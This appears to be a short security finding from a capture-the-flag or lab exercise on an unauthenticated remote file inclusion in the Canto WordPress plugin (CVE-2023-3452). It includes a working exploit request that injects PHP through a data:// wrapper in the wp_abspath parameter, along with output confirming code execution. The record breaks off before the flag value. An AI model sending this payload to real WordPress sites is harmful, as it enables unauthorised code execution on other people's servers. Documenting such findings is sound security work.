findings.title: CVE-2023-3452: Canto Plugin ≤ 3.0.4 - Unauthenticated Remote File Inclusion (RFI) → RCE → Flag
findings.description: The Canto WordPress plugin version 3.0.4 (and below) contains multiple PHP files in wp-content/plugins/canto/includes/lib/ that are directly accessible without authentication and use user-supplied input in require_once() calls. The parameter wp_abspath (or abspath) is passed directly to require_once() without sanitization, enabling Remote File Inclusion via the data:// PHP stream wrapper. This allows unauthenticated attackers to execute arbitrary PHP code on the server.
findings.evidence:
Exploit: POST /wp-content/plugins/canto/includes/lib/download.php with body: wp_abspath=data://text/plain,<?php echo file_get_contents('/FLAG.txt'); ?>

RCE confirmation (id):
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Flag extracted from /FLAG.txt:
